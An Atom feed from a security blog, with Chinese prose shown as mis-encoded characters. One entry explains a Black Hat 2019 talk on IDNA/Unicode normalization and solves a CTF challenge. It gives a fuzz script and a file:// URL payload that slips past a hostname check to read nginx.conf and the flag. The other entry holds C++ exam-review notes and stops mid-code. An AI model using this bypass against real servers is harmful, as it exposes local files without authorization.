<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>å­¦ä¹ æœ¬æ— åº•ï¼Œå‰è¿›è«å½·å¾¨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2019-09-17T13:27:05.198Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exploitable Antipatterns in Unicode Normalization</title>
    <link href="0verwatch.top/exploit-in-unicode-normalization.html"/>
    <id>0verwatch.top/exploit-in-unicode-normalization.html</id>
    <published>2019-09-17T13:09:35.000Z</published>
    <updated>2019-09-17T13:27:05.198Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸€ç¯‡æ–‡ç« æºè‡ªäºBlack hat 2019çš„ä¸€ä¸ªè®®é¢˜ï¼Œæœ‰ä¸€ä¸ªè¯¦ç»†çš„<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">ppt</a>çœ‹ç€å¥½åƒæŒºæœ‰è¶£ï¼Œæ‹¿è¿‡æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œè€Œä¸”æœ€è¿‘ä¹Ÿæœ‰CTFé¢˜ç›®å‡ºç°äº†æœ‰å…³è¿™ä¸ªçš„çŸ¥è¯†ç‚¹ï¼Œç»“åˆä¸€ä¸‹è¿™ä¸ªé¢˜ç›®çœ‹çœ‹ï¼Œä¸»è¦æ˜¯å¤ä¹ æœºè¯•æ²¡å…´è¶£ï¼Œå¾—æ‰¾ç‚¹å…¶ä»–ä¸œè¥¿<a id="more"></a>çœ‹çœ‹ã€‚</p><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>ä»è¿™ä¸ªè®®é¢˜æ¥çœ‹åº”è¯¥æ˜¯ä¸ªç¼–ç é—®é¢˜å¯¼è‡´çš„æ¼æ´</p><p>è®®é¢˜äººç»™å‡ºäº†ğ“€¬.netè¿™æ ·çš„ä¸€ä¸ªç½‘å€ï¼Œä½†æ˜¯ä¼šè·³è½¬åˆ°<code>http://xn--fq7d.net/</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªäººç«™åœ¨ä¸¤å¤´é•¿é¢ˆé¹¿ä¸Šï¼Œæ˜¯ä¸€ä¸ªåŸƒåŠçš„æ–‡å­—ä»£è¡¨å¿™ç¢Œã€‚ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Ÿéœ€è¦äº†è§£è¿™æ˜¯æ€ä¹ˆç¼–ç è§£ç çš„~</p><h3 id="ä¸€äº›åŸºç¡€"><a href="#ä¸€äº›åŸºç¡€" class="headerlink" title="ä¸€äº›åŸºç¡€"></a>ä¸€äº›åŸºç¡€</h3><h4 id="ä»€ä¹ˆæ˜¯IDNï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯IDNï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯IDNï¼Ÿ"></a>ä»€ä¹ˆæ˜¯IDNï¼Ÿ</h4><p>å›½é™…åŒ–åŸŸåIDNs (Internationalized Domain Names)ä¹Ÿç§°å¤šè¯­ç§åŸŸåï¼Œæ˜¯æŒ‡éè‹±è¯­å›½å®¶ä¸ºæ¨å¹¿æœ¬å›½è¯­è¨€çš„åŸŸåç³»ç»Ÿçš„ä¸€ä¸ªæ€»ç§°ï¼Œä¾‹å¦‚å«æœ‰æ—¥æ–‡çš„ä¸ºæ—¥æ–‡åŸŸåï¼Œå«æœ‰ä¸­æ–‡çš„åŸŸåä¸ºä¸­æ–‡åŸŸåã€‚ç®€å•æ»´è¯´å°±æ˜¯éè‹±è¯­è¡¨ç¤ºçš„åŸŸåã€‚</p><h4 id="Punycode"><a href="#Punycode" class="headerlink" title="Punycode"></a>Punycode</h4><p>æ˜¯ä¸€ç§è¡¨ç¤ºUnicodeç å’ŒASCIIç çš„æœ‰é™çš„å­—ç¬¦é›†ã€‚ä¾‹å¦‚ï¼šâ€œmÃ¼nchenâ€ï¼ˆå¾·å›½æ…•å°¼é»‘ï¼‰ä¼šè¢«ç¼–ç ä¸ºâ€œmnchen-3yaâ€ã€‚ç”¨äºDNSç³»ç»Ÿçš„ç¼–ç  ï¼Œé˜²æ­¢æ‰€è°“çš„IDNæ¬ºéª—ã€‚</p><p>åœ¨IDNsï¼ˆå›½é™…åŒ–åŸŸåInternationalized Domain Namesï¼‰æ¨å‡ºä»¥åï¼Œä¸ºäº†ä¿è¯å…¼å®¹ä»¥å‰çš„DNSï¼Œæ‰€ä»¥ï¼Œå¯¹è¿™äº›éè‹±è¯­çš„å­—ç¬¦è¿›è¡Œpunycodeè½¬ç ï¼Œè½¬ç åçš„punycodeå°±ç”±26ä¸ªå­—æ¯+10ä¸ªæ•°å­—ï¼Œè¿˜æœ‰â€œ-â€ç»„æˆã€‚</p><h4 id="IDNçš„æ‰§è¡Œè¿‡ç¨‹"><a href="#IDNçš„æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="IDNçš„æ‰§è¡Œè¿‡ç¨‹"></a>IDNçš„æ‰§è¡Œè¿‡ç¨‹</h4><p><img src="https://s2.ax1x.com/2019/09/17/nIVDsK.png" alt="nIVDsK.png" style="zoom:33%;"></p><p>ä¸€å…±æ˜¯ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€ä¸ªæ˜¯Normalizationï¼Œæ™®é€šåŒ–ï¼Œæ­¤æ—¶ï¼Œå°±æ˜¯æŠŠå„å›½çš„æ–‡å­—å˜æˆä¸€ä¸ªæ ‡å‡†çš„å½¢å¼ï¼Œç±»ä¼¼ä¸€ä¸ªè¿‡æ¸¡</p><p><img src="https://s2.ax1x.com/2019/09/17/nIerUe.png" alt="nIerUe.png" style="zoom: 33%;"></p><p>ç¬¬äºŒä¸ªå°±æ˜¯ä¸€ä¸ªpunycodeè½¬ç ï¼Œå°†unicodeè½¬åŒ–æˆacsii</p><p><img src="https://s2.ax1x.com/2019/09/17/nInFYQ.png" alt="nInFYQ.png" style="zoom: 33%;"></p><p>è¿™ä¸ªè®®é¢˜æŒ‡å‡ºå…³é”®ç‚¹åœ¨äºéƒ¨åˆ†å­—ç¬¦åœ¨ç»è¿‡Normalizationè¿™ä¸€éƒ¨åˆ†çš„æ—¶å€™ç›´æ¥å˜æˆasciiç ï¼Œç„¶åå¦‚æœåœ¨ç»å†ä¸€épunycodeè½¬ç ä¹Ÿæ˜¯æ²¡å•¥ä¸åŒï¼Œè¿˜æ˜¯asciiç ï¼Œå°±æ˜¯ä¸‹å›¾ï¼Œå¯ä»¥ä½¿ç”¨è¯¥ç½‘å€è¿›è¡Œæµ‹è¯•<code>https://www.punycoder.com/</code>ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/17/nIKqFU.png" alt="nIKqFU.png" style="zoom: 33%;"></p><p><img src="https://s2.ax1x.com/2019/09/17/nIKjSJ.png" alt="nIKjSJ.png" style="zoom:33%;"></p><p>è¿™æ ·çš„é—®é¢˜å¯ä»¥åˆ©ç”¨åœ¨å¾ˆå¤šè·³è½¬æ¼æ´ä¸Šï¼Œè¯¥è®®é¢˜çš„ä½œè€…åœ¨pptä¸Šä¹ŸæŒ‡å‡ºä»–åœ¨ä¸€äº›æµè§ˆå™¨å’Œåœ¨å“ªäº›ç¼–ç¨‹è¯­è¨€ä¸­å‘ç°çš„ç›¸ä¼¼æ¼æ´ç‚¹</p><p><img src="https://s2.ax1x.com/2019/09/17/nIQuv9.png" alt="nIQuv9.png"></p><p>å½“ç„¶å¾ˆå¤šCVEä¹Ÿå·²ç»è¢«ä¿®å¤äº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘æ²¡æ›´æ–°pythonï¼Œæˆ‘è‡ªå·±çš„pythonè¿˜æ˜¯å­˜åœ¨è¿™ä¸ªé—®é¢˜çš„(âŠ™oâŠ™)â€¦</p><p><img src="https://s2.ax1x.com/2019/09/17/nI1v4K.png" alt="nI1v4K.png" style="zoom: 67%;"></p><p>å½“ç„¶ä¹Ÿä¸æ­¢ä¸Šé¢é‚£ä¸€ä¸ªå­—ç¬¦å­˜åœ¨è¿™æ ·çš„é—®é¢˜ï¼Œå€Ÿç”¨altmanå¤§ä½¬çš„fuzzè„šæœ¬ï¼Œå¯ä»¥æŠŠå…¶ä»–ç±»ä¼¼å­—ç¬¦ä¹Ÿæå‡ºæ¥ï¼ŒåŸç†å¾ˆç®€å•å°±æ˜¯ï¼Œä»ASCIIä»¥å¤–çš„å­—ç¬¦å»åˆ¤æ–­ï¼Œä»¥æ˜¯å¦å­˜åœ¨<code>-</code>å…³é”®å­—ä½œä¸ºåˆ¤æ–­æ¡ä»¶å³å¯ï¼Œæˆ‘å°±ä¸é‡å¤é€ è½®å­äº†ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">tmp=chr(i)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(<span class="string">"U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; "</span>.format(tmp,res,i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±ç»“åˆé¢˜ç›®å­¦ä¹ ä¸€ä¸‹äº†233333</p><p>é¢˜ç›®æ¥æºï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/pythonginx" target="_blank" rel="noopener">SUSCTF2019-pythonginx</a></p><p>é¢˜ç›®ç»™å‡ºéƒ¨åˆ†æºä»£ç ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>åæ­£è¿™ä¸ªä»£ç çš„æ„æ€å°±æ˜¯åŸŸåé‡Œé¢ä¸å…è®¸å‡ºç°<code>suctf.cc</code>ï¼Œä½†æœ€åç»è¿‡Normalizationå¤„ç†ä¹‹åæ»¡è¶³<code>suctf.cc</code>å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œæ­£å¥½æ˜¯ä¸Šé¢çš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä»£æ›¿å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦å³å¯ï¼Œè¿™é‡Œä»fuzzçš„å­—ç¬¦ä¸­æ‰¾åˆ°<code>ï¼£</code>å»æ›¿ä»£ï¼Œæœ€åä½¿ç”¨fileåè®®å»è¯»å–æ–‡ä»¶ï¼Œå…ˆæ˜¯æŒ‰ç…§æç¤ºè¯»å–nginxçš„é…ç½®æ–‡ä»¶,<code>file://suctf.cï¼£/../../../../usr/local/nginx/conf/nginx.conf</code>ï¼Œç„¶åå†å»è¯»å–flagå°±å¥½</p><p><img src="https://s2.ax1x.com/2019/09/17/nIUWf1.png" alt="nIUWf1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™ä¸€ç¯‡æ–‡ç« æºè‡ªäºBlack hat 2019çš„ä¸€ä¸ªè®®é¢˜ï¼Œæœ‰ä¸€ä¸ªè¯¦ç»†çš„&lt;a href=&quot;https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ppt&lt;/a&gt;çœ‹ç€å¥½åƒæŒºæœ‰è¶£ï¼Œæ‹¿è¿‡æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œè€Œä¸”æœ€è¿‘ä¹Ÿæœ‰CTFé¢˜ç›®å‡ºç°äº†æœ‰å…³è¿™ä¸ªçš„çŸ¥è¯†ç‚¹ï¼Œç»“åˆä¸€ä¸‹è¿™ä¸ªé¢˜ç›®çœ‹çœ‹ï¼Œä¸»è¦æ˜¯å¤ä¹ æœºè¯•æ²¡å…´è¶£ï¼Œå¾—æ‰¾ç‚¹å…¶ä»–ä¸œè¥¿
    
    </summary>
    
      <category term="Webå®‰å…¨" scheme="0verwatch.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Webå®‰å…¨" scheme="0verwatch.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>çæçš„æœºè¯•å¤ä¹ </title>
    <link href="0verwatch.top/byoj-review.html"/>
    <id>0verwatch.top/byoj-review.html</id>
    <published>2019-09-17T13:08:15.000Z</published>
    <updated>2019-09-17T15:52:34.824Z</updated>
    
    <content type="html"><![CDATA[<p>ä¿ç ”çš„äº‹æƒ…ä»¤äººå¤´ç–¼ï¼Œè¿˜ä¸çŸ¥é“èƒ½ä¸èƒ½å»è‡ªå·±å¿ƒä»ªçš„å­¦æ ¡ï¼Œæ¯å¤©è¦å¤ä¹ ä¸€ä¸‹æœºè¯•ï¼Œçœ‹ç€è¿‘æœŸçš„æ¯”èµ›å¥½åƒå‡ºäº†ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ä¹Ÿä¸èƒ½å»å­¦ï¼ŒçœŸçš„éš¾å—ï¼Œåªèƒ½ç¡¬ç€å¤´çš®å¤ä¹ å…¶ä»–çš„ä¸€äº›ä¸æ„Ÿå…´è¶£çš„çŸ¥è¯†ï¼Œæˆ‘å¤ªéš¾<a id="more"></a>äº†ã€‚ã€‚</p><h4 id="æ ¼å¼é—®é¢˜"><a href="#æ ¼å¼é—®é¢˜" class="headerlink" title="æ ¼å¼é—®é¢˜"></a>æ ¼å¼é—®é¢˜</h4><p>scanfå‡½æ•°è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯â€%sâ€çš„æ—¶å€™ï¼Œå˜é‡å‰ä¸éœ€è¦åŠ <code>&amp;</code>ï¼›å¦å¤–åœ¨<code>%d</code>ä¹‹é—´æ’å…¥æ•°å­—æ¥è¯»å–ç‰¹å®šä½æ•°çš„æ•°å­—çš„æŠ€å·§æœ‰æ—¶å€™å¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚<code>%2d</code>ä»£è¡¨çš„æ˜¯ä»è¿™ä¸²æ•°å­—ä¸²ä¸­è·å–ä¸¤ä½æ•°å­—å‡ºæ¥ã€‚</p><p>printfå‡½æ•°ä½¿ç”¨çš„æ—¶å€™æ³¨æ„å˜é‡å‰ä¸éœ€è¦<code>&amp;</code>ï¼Œä¸ç„¶ä¼šè¾“å‡ºåœ°å€ï¼Œå¦‚æœåœ¨æŸäº›è¾“å‡ºå°æ•°éœ€è¦ä¿ç•™å¤šå°‘ä½ï¼Œåˆ™éœ€è¦æ³¨æ„æ ¼å¼çš„ä¸²æ˜¯è¿™æ ·çš„<code>%.3lf</code>ï¼Œæ˜¯åœ¨å°æ•°ç‚¹ååŠ ä¸Šæ•°å­—3</p><p>getså‡½æ•°ä»¥å›è½¦ç»“æŸã€‚ç©ºæ ¼æ˜¯å¯ä»¥è¯»è¿›å»çš„ï¼Œæœ€å¥½åŠ ä¸Šgetchar()æ¶ˆé™¤å›è½¦</p><h4 id="æ’åºç±»"><a href="#æ’åºç±»" class="headerlink" title="æ’åºç±»"></a>æ’åºç±»</h4><p>è¿™ç§é¢˜å‹ä¸€èˆ¬ä½¿ç”¨C++å†…ç½®çš„sortå‡½æ•°ï¼Œæ ¹æ®é¢˜ç›®ä½¿ç”¨è‡ªå·±æ„é€ çš„æ’åºå‡½æ•°ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰cmpå‡½æ•°ï¼Œå¦ä¸€ç§æ˜¯ç›´æ¥åœ¨ç»“æ„ä½“é‡Œé¢è¿ç®—ç¬¦é‡è½½ã€‚å¥½åƒå¯¹äºå †è¿™ç§æ•°æ®ç»“æ„æœ‰ç‚¹ä¸åŒã€‚</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0E9A.png" alt="nI0E9A.png" style="zoom:80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Stu &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(score != A.score) <span class="keyword">return</span> score&lt;A.score;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,A.name))  <span class="keyword">return</span> <span class="built_in">strcmp</span>(name,A.name)&lt;<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> age&lt;A.age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;N)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>,buff[i].name,&amp;buff[i].age,&amp;buff[i].score);</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+N);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d %d\n"</span>,buff[i].name,buff[i].age,buff[i].score);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ—¥æœŸç±»"><a href="#æ—¥æœŸç±»" class="headerlink" title="æ—¥æœŸç±»"></a>æ—¥æœŸç±»</h4><p><img src="https://s2.ax1x.com/2019/09/17/nI0UBT.png" alt="nI0UBT.png"></p><p>æœ€å¤§çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯æ‰¾ä¸€ä¸ªç»Ÿä¸€èµ·ç‚¹ï¼Œä¸€èˆ¬éƒ½æ˜¯ä»¥0å¹´1æœˆ1æ—¥å¼€å§‹ï¼Œè®¾ç½®æ—¥å­çš„ç»“æ„ä½“ï¼Œç„¶åä»¥æš´åŠ›æ‰“è¡¨çš„æ–¹å¼è¾“å‡ºï¼Œæ³¨æ„çš„æ˜¯é—°å¹´çš„åˆ¤æ–­æ–¹å¼ï¼Œæ—¥æœŸå¤„ç†æ˜¯å¦éœ€è¦ï¼Œå­¦ä¹ å¦‚ä½•å·§å¦™åœ°ä½¿ç”¨æ•°ç»„å­˜å‚¨ï¼Œä¹Ÿè¦æ³¨æ„å­˜è¿™ç§æ–¹æ³•å­˜åœ¨ç¼ºé™·ï¼Œå¹´ä»½æ•°é¢æ˜¯æœ‰ä¸€å®šä¸Šé™çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISYEARP(x)  x % 4 == 0&amp;&amp; x%100 != 0 || x % 400 ==0 ?1:0 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> day0fmonth[<span class="number">13</span>][<span class="number">2</span>]=&#123;</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">28</span>,<span class="number">29</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Date</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Nextday</span><span class="params">()</span></span>&#123;</span><br><span class="line">day++;</span><br><span class="line"><span class="keyword">if</span>(day &gt; day0fmonth[month][ISYEARP(year)])&#123;</span><br><span class="line">month++;</span><br><span class="line">day = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(month &gt; <span class="number">12</span>)&#123;</span><br><span class="line">month = <span class="number">1</span>;</span><br><span class="line">year++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> buff[<span class="number">5001</span>][<span class="number">13</span>][<span class="number">32</span>];  <span class="comment">//æœ€å¥½æ”¾å…¨å±€ï¼Œä¸ç„¶æœ‰å¯èƒ½çˆ†æ ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> monthname[<span class="number">13</span>][<span class="number">20</span>] = &#123;</span><br><span class="line"><span class="string">""</span>,</span><br><span class="line"><span class="string">"January"</span>,</span><br><span class="line"><span class="string">"February"</span>,</span><br><span class="line"><span class="string">"March"</span>,</span><br><span class="line"><span class="string">"April"</span>,</span><br><span class="line"><span class="string">"May"</span>,</span><br><span class="line"><span class="string">"June"</span>,</span><br><span class="line"><span class="string">"July"</span>,</span><br><span class="line"><span class="string">"August"</span>,</span><br><span class="line"><span class="string">"September"</span>,</span><br><span class="line"><span class="string">"October"</span>,</span><br><span class="line"><span class="string">"November"</span>,</span><br><span class="line"><span class="string">"December"</span>,</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> weekname[<span class="number">7</span>][<span class="number">20</span>] = &#123;</span><br><span class="line"><span class="string">"Sunday"</span>,</span><br><span class="line"><span class="string">"Monday"</span>,</span><br><span class="line"><span class="string">"Tuesday"</span>,</span><br><span class="line"><span class="string">"Wednesday"</span>,</span><br><span class="line"><span class="string">"Thursday"</span>,</span><br><span class="line"><span class="string">"Friday"</span>,</span><br><span class="line"><span class="string">"Saturday"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Date tmp;</span><br><span class="line">tmp.year = <span class="number">0</span>;</span><br><span class="line">tmp.month = <span class="number">1</span>;</span><br><span class="line">tmp.day = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> cnt  = 